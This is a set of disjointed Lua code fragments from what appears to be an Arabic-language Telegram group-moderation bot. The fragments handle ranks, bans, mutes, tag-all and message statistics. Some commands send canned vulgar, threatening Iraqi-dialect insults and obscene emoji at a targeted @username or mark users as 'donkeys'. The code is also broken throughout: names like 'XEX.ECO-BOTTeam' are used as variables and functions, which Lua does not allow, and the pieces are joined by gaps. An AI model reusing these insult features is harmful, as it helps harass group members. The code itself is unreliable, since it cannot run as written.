DevALS:set(XEX.ECO-BOT..'nodel'..msg.sender_user_id_, 'delno')
...
DevALS:set(XEX.ECO-BOT.."ALS:Del:Me"..msg.chat_id_, true)
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل امر نزلني'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
end
if text == 'تفعيل نزلني' and BasicConstructor(msg) and ChCheck(msg) then
DevALS:del(XEX.ECO-BOT.."ALS:Del:Me"..msg.chat_id_)
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل امر نزلني'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
end
--     Source XEX.ECO-BOT     --
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT..'ALS:Lock:TagAll'..msg.chat_id_)
end
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT..'ALS:Lock:TagAll'..msg.chat_id_,true)
end
if Admin(msg) then
if text == "تاك للكل" and ChCheck(msg) then
if not DevALS:get(XEX.ECO-BOT..'ALS:Lock:TagAll'..msg.chat_id_) then
function TagAll(dp1,dp2)
local text = "☆︙وينكم يالربع \n┉ ┉ ┉ xᴇx┉ ┉ ┉ ┉\n"
i = 0
for k, v in pairs(dp2.members_) do
i = i + 1
if DevALS:get(XEX.ECO-BOT..'Save:UserName'..v.user_id_) then
text = text..i.."~ : [@"..DevALS:get(XEX.ECO-BOT..'Save:UserName'..v.user_id_).."]\n"
else
...
local EntryNumber = (DevALS:get(XEX.ECO-BOT..'ALS:EntryNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local ExitNumber = (DevALS:get(XEX.ECO-BOT..'ALS:ExitNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local MsgNumberDay = (DevALS:get(XEX.ECO-BOT..'ALS:MsgNumberDay'..msg.chat_id_..':'..os.date('%d')) or 0)
...
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل تفاعلي'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT..'ALS:msg:ALS'..msg.chat_id_) 
end
if text == "تفعيل تفاعلي" and Manager(msg) and ChCheck(msg) then
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل تفاعلي'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT..'ALS:msg:ALS'..msg.chat_id_,true)  
end
if DevALS:get(XEX.ECO-BOT.."ALS:msg:ALS"..msg.chat_id_) then
if msg.content_.ID then
get_msg = DevALS:get(XEX.ECO-BOT.."ALS:msg:ALS"..msg.sender_user_id_..":"..msg.chat_id_) or 0
gms = get_msg + 1
DevALS:setex(XEX.ECO-BOT..'ALS:msg:ALS'..msg.sender_user_id_..":"..msg.chat_id_,86400,gms)
end
...
function prom_reply(extra, result, success) 
get_msg = DevALS:get(XEX.ECO-BOT.."ALS:msg:ALS"..result.sender_user_id_..":"..msg.chat_id_) or 0
...
--     Source XEX.ECO-BOT     --
if text == "جهاتي" and ChCheck(msg) or text == "اضافاتي" and ChCheck(msg) then add = (tonumber(DevALS:get(XEX.ECO-BOT..'ALS:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0) Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙عدد جهاتك المضافه ↫ *❨ "..add.." ❩* ", 1, 'md') end
if text == "تعديلاتي" or text == "سحكاتي" and ChCheck(msg) then local edit_msg = DevALS:get(XEX.ECO-BOT..'ALS:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0  Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙عدد تعديلاتك ↫ *❨ "..edit_msg.." ❩* ", 1, 'md') end
...
if text == 'مسح جهاتي' or text == 'مسح اضافاتي' or text == 'حذف جهاتي' or text == 'حذف اضافاتي' then DevALS:del(XEX.ECO-BOT..'ALS:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_) Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم حذف جميع جهاتك المضافه' , 1, 'md') end
--     Source XEX.ECO-BOT     --
if text and text:match('^هينه @(.*)') and ChCheck(msg) or text and text:match('^هينها @(.*)') and ChCheck(msg) then 
if not DevALS:get(XEX.ECO-BOT..'ALS:Lock:Stupid'..msg.chat_id_) then
local username = text:match('^هينه @(.*)') or text:match('^هينها @(.*)') 
function XEX.ECO-BOTTeam(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(XEX.ECO-BOT) then  
...
if DevALS:sismember(XEX.ECO-BOT.."ALS:ALSConstructor:"..msg.chat_id_,result.id_) then
Dev_ALS(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
local XEX.ECO-BOTTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_ALS(msg.chat_id_, msg.id_, 1,XEX.ECO-BOTTeam, 1, 'md') 
local XEX.ECO-BOTTeam = { "لكك جرجف @"..username.." احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش لكك فاشل @"..username.." لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","حبيبي @"..username.." راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪","دمشي لك @"..username.." ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع @"..username.." متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪",}
Dev_ALS(msg.chat_id_, result.id_, 1,''..XEX.ECO-BOTTeam[math.random(#XEX.ECO-BOTTeam)], 1, 'html') 
else  
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙العضو غير موجود في المجموعه', 1, 'md') 
end 
end 
resolve_username(username,XEX.ECO-BOTTeam)
end
end
--     Source XEX.ECO-BOT     --
...
if tonumber(result.sender_user_id_) == tonumber(XEX.ECO-BOT) then 
Dev_ALS(msg.chat_id_, msg.id_, 1, 'شو تمضرط اكو واحد يهين نفسه؟🤔👌🏿', 1, 'md') 
return false  
end  
...
if DevALS:sismember(XEX.ECO-BOT.."ALS:ALSConstructor:"..msg.chat_id_,result.sender_user_id_) then
Dev_ALS(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
local XEX.ECO-BOTTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_ALS(msg.chat_id_, msg.id_, 1,XEX.ECO-BOTTeam, 1, 'md') 
local XEX.ECO-BOTTeam = {"لكك جرجف احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش فاشل لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","دمشي لك ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪","حبيبي راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪"} 
Dev_ALS(msg.chat_id_, result.id_, 1,''..XEX.ECO-BOTTeam[math.random(#XEX.ECO-BOTTeam)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
...
local XEX.ECO-BOTTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_ALS(msg.chat_id_, msg.id_, 1,XEX.ECO-BOTTeam, 1, 'md') 
local XEX.ECO-BOTTeam = {"مواححح افيش عافيههه😍🔥💗","امممووااهحح شهلعسل🥺🍯💘","مواححح،ءوفف اذوب🤤💗"} 
Dev_ALS(msg.chat_id_, result.id_, 1,''..XEX.ECO-BOTTeam[math.random(#XEX.ECO-BOTTeam)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
...
local XEX.ECO-BOTTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_ALS(msg.chat_id_, msg.id_, 1,XEX.ECO-BOTTeam, 1, 'md') 
local XEX.ECO-BOTTeam = {"تتعال ححب محتاجيك🙂🍭","تعال يولل استاذكك ايريدككك😒🔪","يمعوود تعاال يريدوكك🤕♥️","تعال لكك ديصيحوك😐🖤"} 
Dev_ALS(msg.chat_id_, result.id_, 1,''..XEX.ECO-BOTTeam[math.random(#XEX.ECO-BOTTeam)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
...
local XEX.ECO-BOTTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_ALS(msg.chat_id_, msg.id_, 1,XEX.ECO-BOTTeam, 1, 'md') 
local XEX.ECO-BOTTeam = { "تتعال ححب @"..username.." محتاجيك🙂🍭","تعال يولل @"..username.." استاذكك ايريدككك😒🔪","يمعوود @"..username.." تعاال يريدوكك🤕♥️","تعال لكك @"..username.." ديصيحوك😐🖤",}
Dev_ALS(msg.chat_id_, result.id_, 1,''..XEX.ECO-BOTTeam[math.random(#XEX.ECO-BOTTeam)], 1, 'html') 
else  
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙العضو غير موجود في المجموعه', 1, 'md') 
end 
...
if DevALS:sismember(XEX.ECO-BOT..'ALS:ALSSudo:',result.sender_user_id_) then
ALSsudo = 'المطورين الاساسيين • ' else ALSsudo = '' end
if DevALS:sismember(XEX.ECO-BOT..'ALS:SecondSudo:',result.sender_user_id_) then
secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
if DevALS:sismember(XEX.ECO-BOT..'ALS:SudoBot:',result.sender_user_id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if DevALS:sismember(XEX.ECO-BOT..'ALS:Owner:'..msg.chat_id_, result.sender_user_id_) then
owner = 'المالكين • ' else owner = '' end
if DevALS:sismember(XEX.ECO-BOT..'ALS:BasicConstructor:'..msg.chat_id_, result.sender_user_id_) then
basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
if DevALS:sismember(XEX.ECO-BOT..'ALS:Constructor:'..msg.chat_id_, result.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevALS:sismember(XEX.ECO-BOT..'ALS:Managers:'..msg.chat_id_, result.sender_user_id_) then
manager = 'المدراء • ' else manager = '' end
if DevALS:sismember(XEX.ECO-BOT..'ALS:Admins:'..msg.chat_id_, result.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevALS:sismember(XEX.ECO-BOT..'ALS:VipMem:'..msg.chat_id_, result.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevALS:sismember(XEX.ECO-BOT..'ALS:Cleaner:'..msg.chat_id_, result.sender_user_id_) then
...
DevALS:srem(XEX.ECO-BOT..'ALS:ALSSudo:', result.sender_user_id_)
DevALS:srem(XEX.ECO-BOT..'ALS:SecondSudo:', result.sender_user_id_)
DevALS:srem(XEX.ECO-BOT..'ALS:SudoBot:', result.sender_user_id_)
DevALS:srem(XEX.ECO-BOT..'ALS:Owner:'..msg.chat_id_,result.sender_user_id_)
DevALS:srem(XEX.ECO-BOT..'ALS:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevALS:srem(XEX.ECO-BOT..'ALS:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevALS:srem(XEX.ECO-BOT..'ALS:Managers:'..msg.chat_id_, result.sender_user_id_)
DevALS:srem(XEX.ECO-BOT..'ALS:Admins:'..msg.chat_id_, result.sender_user_id_)
DevALS:srem(XEX.ECO-BOT..'ALS:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevALS:srem(XEX.ECO-BOT..'ALS:Cleaner:'..msg.chat_id_, result.sender_user_id_)
...
if DevALS:sismember(XEX.ECO-BOT..'ALS:ALSSudo:',result.id_) then
ALSsudo = 'المطورين الاساسيين • ' else ALSsudo = '' end
if DevALS:sismember(XEX.ECO-BOT..'ALS:SecondSudo:',result.id_) then
secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
if DevALS:sismember(XEX.ECO-BOT..'ALS:SudoBot:',result.id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if DevALS:sismember(XEX.ECO-BOT..'ALS:Owner:'..msg.chat_id_, result.id_) then
owner = 'المالكين • ' else owner = '' end
if DevALS:sismember(XEX.ECO-BOT..'ALS:BasicConstructor:'..msg.chat_id_, result.id_) then
basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
if DevALS:sismember(XEX.ECO-BOT..'ALS:Constructor:'..msg.chat_id_, result.id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevALS:sismember(XEX.ECO-BOT..'ALS:Managers:'..msg.chat_id_, result.id_) then
manager = 'المدراء • ' else manager = '' end
if DevALS:sismember(XEX.ECO-BOT..'ALS:Admins:'..msg.chat_id_, result.id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevALS:sismember(XEX.ECO-BOT..'ALS:VipMem:'..msg.chat_id_, result.id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevALS:sismember(XEX.ECO-BOT..'ALS:Cleaner:'..msg.chat_id_, result.id_) then
cleaner = 'المنظفين • ' else cleaner = ''
end
...
if ALSDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
DevALS:srem(XEX.ECO-BOT..'ALS:ALSSudo:', result.id_)
DevALS:srem(XEX.ECO-BOT..'ALS:SecondSudo:', result.id_)
DevALS:srem(XEX.ECO-BOT..'ALS:SudoBot:', result.id_)
DevALS:srem(XEX.ECO-BOT..'ALS:Owner:'..msg.chat_id_,result.id_)
DevALS:srem(XEX.ECO-BOT..'ALS:BasicConstructor:'..msg.chat_id_,result.id_)
DevALS:srem(XEX.ECO-BOT..'ALS:Constructor:'..msg.chat_id_,result.id_)
DevALS:srem(XEX.ECO-BOT..'ALS:Managers:'..msg.chat_id_, result.id_)
DevALS:srem(XEX.ECO-BOT..'ALS:Admins:'..msg.chat_id_, result.id_)
DevALS:srem(XEX.ECO-BOT..'ALS:VipMem:'..msg.chat_id_, result.id_)
DevALS:srem(XEX.ECO-BOT..'ALS:Cleaner:'..msg.chat_id_, result.id_)
elseif ALSDelAll(msg.sender_user_id_,msg.chat_id_) == 'ALSsudo' then
DevALS:srem(XEX.ECO-BOT..'ALS:SecondSudo:', result.id_)
DevALS:srem(XEX.ECO-BOT..'ALS:SudoBot:', result.id_)
DevALS:srem(XEX.ECO-BOT..'ALS:Owner:'..msg.chat_id_,result.id_)
...
DevALS:sadd(XEX.ECO-BOT..'ALS:ALSSudo:',result.sender_user_id_)
...
if result.id_ then
DevALS:sadd(XEX.ECO-BOT..'ALS:ALSSudo:',result.id_)
...
DevALS:sadd(XEX.ECO-BOT..'ALS:ALSSudo:',user)
...
DevALS:srem(XEX.ECO-BOT..'ALS:ALSSudo:',user)
...
function sudo_reply(extra, result, success)
DevALS:sadd(XEX.ECO-BOT..'ALS:SecondSudo:',result.sender_user_id_)
...
function promreply(extra,result,success)
if result.id_ then
DevALS:sadd(XEX.ECO-BOT..'ALS:SecondSudo:',result.id_)
...
DevALS:sadd(XEX.ECO-BOT..'ALS:SecondSudo:',user)
...
DevALS:srem(XEX.ECO-BOT..'ALS:SecondSudo:',user)
...
function sudo_reply(extra, result, success)
DevALS:sadd(XEX.ECO-BOT..'ALS:SudoBot:',result.sender_user_id_)
...
function promreply(extra,result,success)
if result.id_ then
DevALS:sadd(XEX.ECO-BOT..'ALS:SudoBot:',result.id_)
...
DevALS:sadd(XEX.ECO-BOT..'ALS:SudoBot:',user)
...
DevALS:srem(XEX.ECO-BOT..'ALS:SudoBot:',user)
...
DevALS:sadd(XEX.ECO-BOT..'ALS:Owner:'..msg.chat_id_,result.sender_user_id_)
...
function promreply(extra,result,success)
if result.id_ then
DevALS:sadd(XEX.ECO-BOT..'ALS:Owner:'..msg.chat_id_,result.id_)
...
DevALS:sadd(XEX.ECO-BOT..'ALS:Owner:'..msg.chat_id_,user)
...
DevALS:srem(XEX.ECO-BOT..'ALS:Owner:'..msg.chat_id_,user)
...
function raf_reply(extra, result, success)
if not ALSConstructor(msg) and DevALS:get(XEX.ECO-BOT.."ALS:Lock:ProSet"..msg.chat_id_) then 
Dev_ALS(msg.chat_id_, msg.id_, 1,'☆︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevALS:sadd(XEX.ECO-BOT..'ALS:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
...
if result.id_ then
DevALS:sadd(XEX.ECO-BOT..'ALS:BasicConstructor:'..msg.chat_id_,result.id_)
...
DevALS:sadd(XEX.ECO-BOT..'ALS:BasicConstructor:'..msg.chat_id_,user)
...
DevALS:srem(XEX.ECO-BOT..'ALS:BasicConstructor:'..msg.chat_id_,user)
...
DevALS:sadd(XEX.ECO-BOT..'ALS:Constructor:'..msg.chat_id_,result.sender_user_id_)
...
if result.id_ then
DevALS:sadd(XEX.ECO-BOT..'ALS:Constructor:'..msg.chat_id_,result.id_)
...
DevALS:sadd(XEX.ECO-BOT..'ALS:Constructor:'..msg.chat_id_,user)
...
DevALS:srem(XEX.ECO-BOT..'ALS:Constructor:'..msg.chat_id_,user)
...
DevALS:sadd(XEX.ECO-BOT..'ALS:Managers:'..msg.chat_id_,user)
...
DevALS:srem(XEX.ECO-BOT..'ALS:Managers:'..msg.chat_id_,user)
...
DevALS:sadd(XEX.ECO-BOT..'ALS:Cleaner:'..msg.chat_id_,result.sender_user_id_)
...
if result.id_ then
DevALS:sadd(XEX.ECO-BOT..'ALS:Cleaner:'..msg.chat_id_,result.id_)
...
DevALS:sadd(XEX.ECO-BOT..'ALS:Cleaner:'..msg.chat_id_,user)
...
DevALS:srem(XEX.ECO-BOT..'ALS:Cleaner:'..msg.chat_id_,user)
...
DevALS:sadd(XEX.ECO-BOT..'ALS:Admins:'..msg.chat_id_,user)
...
DevALS:srem(XEX.ECO-BOT..'ALS:Admins:'..msg.chat_id_,user)
...
DevALS:sadd(XEX.ECO-BOT..'ALS:VipMem:'..msg.chat_id_,user)
...
DevALS:srem(XEX.ECO-BOT..'ALS:VipMem:'..msg.chat_id_,user)
...
function promote_by_reply(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..XEX.ECO-BOT)
local GetInfo = JSON.decode(Check)
...
XEX.ECO-BOTTeam = {"ها هلاو","انطق","كول","تفضل","احبك","عمري","لاف"};
send(msg.sender_user_id_, 0,XEX.ECO-BOTTeam[math.random(#XEX.ECO-BOTTeam)])
end
--     Source XEX.ECO-BOT     --
...
DevALS:del(XEX.ECO-BOT.."ALS:Lock:ProSet"..msg.chat_id_)
...
DevALS:set(XEX.ECO-BOT.."ALS:Lock:ProSet"..msg.chat_id_,"true")
...
if not ALSConstructor(msg) and DevALS:get(XEX.ECO-BOT.."ALS:Lock:KickBan"..msg.chat_id_) then 
...
ChatKick(result.chat_id_, result.sender_user_id_)
DevALS:sadd(XEX.ECO-BOT..'ALS:Ban:'..msg.chat_id_, result.sender_user_id_)
...
if not Constructor(msg) and DevALS:get(XEX.ECO-BOT.."ALS:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'☆︙لقد تم تعطيل الطرد والحظر من قبل مالك المجموعه')
return false
end
if result.id_ then
...
ChatKick(msg.chat_id_, result.id_)
DevALS:sadd(XEX.ECO-BOT..'ALS:Ban:'..msg.chat_id_, result.id_)
...
ChatKick(msg.chat_id_, user)
DevALS:sadd(XEX.ECO-BOT..'ALS:Ban:'..msg.chat_id_, user)
...
DevALS:srem(XEX.ECO-BOT..'ALS:Ban:'..msg.chat_id_, result.sender_user_id_)
...
if result.id_ then
DevALS:srem(XEX.ECO-BOT..'ALS:Ban:'..msg.chat_id_, result.id_)
...
DevALS:srem(XEX.ECO-BOT..'ALS:Ban:'..msg.chat_id_, user)
...
if not ALSConstructor(msg) and DevALS:get(XEX.ECO-BOT.."ALS:Lock:MuteTked"..msg.chat_id_) then 
...
if DevALS:sismember(XEX.ECO-BOT..'ALS:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","☆︙هو بالفعل مكتوم من المجموعه")  
else
DevALS:sadd(XEX.ECO-BOT..'ALS:Muted:'..msg.chat_id_, result.sender_user_id_)
...
if DevALS:sismember(XEX.ECO-BOT..'ALS:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"Reply","☆︙هو بالفعل مكتوم من المجموعه")  
else
DevALS:sadd(XEX.ECO-BOT..'ALS:Muted:'..msg.chat_id_, result.id_)
...
if DevALS:sismember(XEX.ECO-BOT..'ALS:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"Reply","☆︙هو بالفعل مكتوم من المجموعه")  
else
DevALS:sadd(XEX.ECO-BOT..'ALS:Muted:'..msg.chat_id_, user)
...
if not DevALS:sismember(XEX.ECO-BOT..'ALS:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","☆︙هو ليس مكتوم لالغاء كتمه")  
else
DevALS:srem(XEX.ECO-BOT..'ALS:Muted:'..msg.chat_id_, result.sender_user_id_)
...
if result.id_ then
if not DevALS:sismember(XEX.ECO-BOT..'ALS:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"Reply","☆︙هو ليس مكتوم لالغاء كتمه")  
else
DevALS:srem(XEX.ECO-BOT..'ALS:Muted:'..msg.chat_id_, result.id_)
...
if not DevALS:sismember(XEX.ECO-BOT..'ALS:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"Reply","☆︙هو ليس مكتوم لالغاء كتمه")  
else
DevALS:srem(XEX.ECO-BOT..'ALS:Muted:'..msg.chat_id_, user)
...
DevALS:sadd(XEX.ECO-BOT..'ALS:Tkeed:'..msg.chat_id_, result.sender_user_id_)
...
DevALS:sadd(XEX.ECO-BOT..'ALS:Tkeed:'..msg.chat_id_, result.id_)
...
DevALS:sadd(XEX.ECO-BOT..'ALS:Tkeed:'..msg.chat_id_, user)
...
DevALS:srem(XEX.ECO-BOT..'ALS:Tkeed:'..msg.chat_id_, result.sender_user_id_)
...
DevALS:srem(XEX.ECO-BOT..'ALS:Tkeed:'..msg.chat_id_, result.id_)
...
DevALS:srem(XEX.ECO-BOT..'ALS:Tkeed:'..msg.chat_id_, user)
...
if DevALS:sismember(XEX.ECO-BOT..'ALS:ALSSudo:',result.sender_user_id_) and not Sudo(msg) then
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevALS:sismember(XEX.ECO-BOT..'ALS:SecondSudo:',result.sender_user_id_) and not ALSSudo(msg) then
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
ChatKick(result.chat_id_, result.sender_user_id_)
DevALS:sadd(XEX.ECO-BOT..'ALS:BanAll:', result.sender_user_id_)
...
if DevALS:sismember(XEX.ECO-BOT..'ALS:ALSSudo:',result.id_) and not Sudo(msg) then
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevALS:sismember(XEX.ECO-BOT..'ALS:SecondSudo:',result.id_) and not ALSSudo(msg) then
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
if result.id_ then
ChatKick(msg.chat_id_, result.id_)
DevALS:sadd(XEX.ECO-BOT..'ALS:BanAll:', result.id_)
...
if tonumber(user) == tonumber(XEX.ECO-BOT) then  
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙*لاتستطيع حظر البوت عام*", 1, 'md')
return false 
end
...
if DevALS:sismember(XEX.ECO-BOT..'ALS:ALSSudo:',user) and not Sudo(msg) then
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevALS:sismember(XEX.ECO-BOT..'ALS:SecondSudo:',user) and not ALSSudo(msg) then
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
ChatKick(msg.chat_id_, user)
DevALS:sadd(XEX.ECO-BOT..'ALS:BanAll:', user)
...
DevALS:sadd(XEX.ECO-BOT..'ALS:MuteAll:', result.sender_user_id_)          
...
if result.id_ then
DevALS:sadd(XEX.ECO-BOT..'ALS:MuteAll:', result.id_)
...
DevALS:sadd(XEX.ECO-BOT..'ALS:MuteAll:', user)
...
DevALS:srem(XEX.ECO-BOT..'ALS:BanAll:', result.sender_user_id_)
DevALS:srem(XEX.ECO-BOT..'ALS:MuteAll:', result.sender_user_id_)
...
if result.id_ then
DevALS:srem(XEX.ECO-BOT..'ALS:BanAll:', result.id_)
DevALS:srem(XEX.ECO-BOT..'ALS:MuteAll:', result.id_)
...
DevALS:srem(XEX.ECO-BOT..'ALS:BanAll:', user)
DevALS:srem(XEX.ECO-BOT..'ALS:MuteAll:', user)
...
DevALS:setex(XEX.ECO-BOT.."ALS:EditDev"..msg.sender_user_id_,300,true)
end
if DevALS:get(XEX.ECO-BOT.."ALS:EditDev"..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_,'☆︙تم الغاء امر تغير المطور الاساسي')
DevALS:del(XEX.ECO-BOT.."ALS:EditDev"..msg.sender_user_id_)
return false
end
if text and text:match("^(%d+)$") then 
...
if dp.first_name_ ~= false then
DevALS:del(XEX.ECO-BOT.."ALS:EditDev"..msg.sender_user_id_)
DevALS:set(XEX.ECO-BOT.."ALS:NewDev"..msg.sender_user_id_,dp.id_)
...
--     Source XEX.ECO-BOT     --
if msg.reply_to_message_id_ ~= 0 then
if text and text:match("^رفع مطي$") and not DevALS:get(XEX.ECO-BOT..'ALS:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if DevALS:sismember(XEX.ECO-BOT..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","☆︙هو مطي شرفع منه بعد😹💔") 
else
ReplyStatus(msg,result.sender_user_id_,"Reply","☆︙تم رفعه في قائمة المطايه") 
DevALS:sadd(XEX.ECO-BOT..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
--     Source XEX.ECO-BOT     --
if msg.reply_to_message_id_ ~= 0  then
if text and text:match("^تنزيل مطي$") and not DevALS:get(XEX.ECO-BOT..'ALS:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if not DevALS:sismember(XEX.ECO-BOT..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","☆︙هو ليس مطي ليتم تنزيله") 
else
DevALS:srem(XEX.ECO-BOT..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
...
DevALS:set('XEX.ECO-BOTTeam:'..XEX.ECO-BOT..'id:user'..msg.chat_id_,TXT)  
DevALS:setex('XEX.ECO-BOTTeam:'..XEX.ECO-BOT.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
...
DevALS:del(XEX.ECO-BOT..'ALS:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_) 
DevALS:incrby(XEX.ECO-BOT..'ALS:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_,Num) 
...
DevALS:set('XEX.ECO-BOTTeam:'..XEX.ECO-BOT..'ids:user'..msg.chat_id_,TXT)  
DevALS:setex('XEX.ECO-BOTTeam:'..XEX.ECO-BOT.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
...
function Reply(extra, result, success)
DevALS:incrby(XEX.ECO-BOT..'ALS:GamesNumber'..msg.chat_id_..result.sender_user_id_,Num) 
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم اضافة "..Num..' نقطه', 1, 'md') 
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},Reply, nil)
return false
end
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Clean'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ or msg.content_.animated_ then if msg.reply_to_message_id_ ~= 0 then DevALS:sadd(XEX.ECO-BOT.."ALS:cleaner"..msg.chat_id_, msg.id_) else DevALS:sadd(XEX.ECO-BOT.."ALS:cleaner"..msg.chat_id_, msg.id_) end end end
